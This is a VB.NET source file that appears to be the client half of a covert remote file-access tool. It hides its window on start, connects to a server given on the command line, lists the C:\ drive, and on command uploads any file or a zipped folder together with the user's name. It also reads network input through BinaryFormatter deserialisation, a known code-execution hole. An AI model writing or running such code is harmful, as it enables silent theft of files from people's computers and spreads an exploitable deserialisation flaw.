Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.IO.Compression

Public Class Main
    Dim YO As New TcpClient
    Dim NS As NetworkStream
    Dim ServerIP As String ' = "localhost"
    Dim ServerPort As Integer ' = 190322

    Dim RECIBE As Thread
    Dim ENVIA As Thread
    Public ENVIO As Byte()

    Private Sub Client_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        ReadParameters()
        Iniciar()
    End Sub
    Private Sub Client_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            ENVIO = System.Text.Encoding.UTF7.GetBytes("[END]>")
            NS.Dispose()
            YO.Close()
        Catch
        End Try
    End Sub

    Sub ReadParameters()
        Try
            If My.Application.CommandLineArgs.Count = 0 Then
                End
            Else
                For i As Integer = 0 To My.Application.CommandLineArgs.Count - 1
                    Dim parameter As String = My.Application.CommandLineArgs(i)
                    If parameter.ToLower Like "*--serverip*" Then
                        Dim args As String() = parameter.Split("-")
                        ServerIP = args(3)
                    ElseIf parameter.ToLower Like "*--serverport*" Then
                        Dim args As String() = parameter.Split("-")
                        ServerPort = Integer.Parse(args(3))
                    End If
                Next
            End If
        Catch ex As Exception
            Console.WriteLine("ReadParameters Error: " & ex.Message)
            End
        End Try
    End Sub

    Sub Iniciar()
        Try
            YO.Connect(ServerIP, ServerPort)
            RECIBE = New Thread(AddressOf RECIBIR)
            RECIBE.Start()
            ENVIA = New Thread(AddressOf ENVIAR)
            ENVIA.Start()
            Procesar("C:\")
        Catch ex As Exception
            Console.WriteLine("Iniciar Error: " & ex.Message)
            End
        End Try
    End Sub

    Sub RECIBIR()
        Try
            While True
                NS = YO.GetStream
                Dim BF As New BinaryFormatter
                If NS.DataAvailable Then
                    Procesar(System.Text.Encoding.UTF7.GetString(BF.Deserialize(NS)))
                End If
            End While
        Catch ex As Exception
            Console.WriteLine("RECIBIR Error: " & ex.Message)
            End
        End Try
    End Sub
    Sub ENVIAR()
        Try
            While True
                If ENVIO IsNot Nothing Then
                    Dim BF As New BinaryFormatter
                    NS = YO.GetStream
                    BF.Serialize(NS, ENVIO)
                    ENVIO = Nothing
                End If
            End While
        Catch ex As Exception
            Console.WriteLine("ENVIAR Error: " & ex.Message)
            End
        End Try
    End Sub
    Sub Procesar(ByVal contenido As String)
        Try
            Dim paquete As String = contenido.Remove(0, contenido.LastIndexOf(">") + 1)
            If contenido = "[END]>" Then
                End
            ElseIf contenido.StartsWith("[GET_FILE]>") Then
                ENVIO = System.Text.Encoding.UTF7.GetBytes("[FILE]>" & paquete & "|" & IO.Path.GetExtension(paquete) & "|" & FileLen(paquete) & "|" & Environment.UserName)
                Thread.Sleep(1000)
                EnviarFichero(paquete)

            ElseIf contenido.StartsWith("[GET_FOLDER]>") Then
                ZipFile.CreateFromDirectory(paquete, paquete & ".zip")
                ENVIO = System.Text.Encoding.UTF7.GetBytes("[FILE]>" & paquete & ".zip" & "|" & IO.Path.GetExtension(paquete & ".zip") & "|" & FileLen(paquete & ".zip") & "|" & Environment.UserName)
                Thread.Sleep(1000)
                EnviarFichero(paquete & ".zip")

            Else
                If contenido = "C:" Then
                    contenido = "C:\"
                End If
                Dim folders As String = Nothing
                Dim files As String = Nothing

                For Each folder As String In My.Computer.FileSystem.GetDirectories(contenido, FileIO.SearchOption.SearchTopLevelOnly)
                    folders &= folder & "|"
                Next

                For Each file As String In My.Computer.FileSystem.GetFiles(contenido, FileIO.SearchOption.SearchTopLevelOnly)
                    files &= file & "|"
                Next

                ENVIO = System.Text.Encoding.UTF7.GetBytes(folders & files)
            End If
            Console.WriteLine("[Procesar] " & contenido)
        Catch ex As Exception
            Console.WriteLine("Procesar Error: " & ex.Message)
        End Try
    End Sub

    Dim TAMAÑOBUFFER As Integer = 1024
    Sub EnviarFichero(ByVal filePath As String)
        Try
            Dim CLIENTE As New TcpClient(ServerIP, Val(ServerPort + 1))
            Dim NS As NetworkStream = CLIENTE.GetStream
            Dim FS As New FileStream(filePath, FileMode.Open, FileAccess.Read)
            Dim PAQUETES As Integer = CInt(Math.Ceiling(CDbl(FS.Length) / CDbl(TAMAÑOBUFFER)))
            Dim LONGITUDTOTAL As Integer = CInt(FS.Length)
            Dim LONGITUDPAQUETEACTUAL As Integer = 0
            Dim CONTADOR As Integer = 0
            For I As Integer = 0 To PAQUETES - 1
                If LONGITUDTOTAL > TAMAÑOBUFFER Then
                    LONGITUDPAQUETEACTUAL = TAMAÑOBUFFER
                    LONGITUDTOTAL = LONGITUDTOTAL - LONGITUDPAQUETEACTUAL
                Else
                    LONGITUDPAQUETEACTUAL = LONGITUDTOTAL
                End If
                Dim ENVIARBUFFER As Byte() = New Byte(LONGITUDPAQUETEACTUAL - 1) {}
                FS.Read(ENVIARBUFFER, 0, LONGITUDPAQUETEACTUAL)
                NS.Write(ENVIARBUFFER, 0, CInt(ENVIARBUFFER.Length))
            Next
            FS.Close()
            NS.Close()
            CLIENTE.Close()
        Catch ex As Exception
            Console.WriteLine("EnviarFichero Error: " & ex.Message)
        End Try
    End Sub
End Class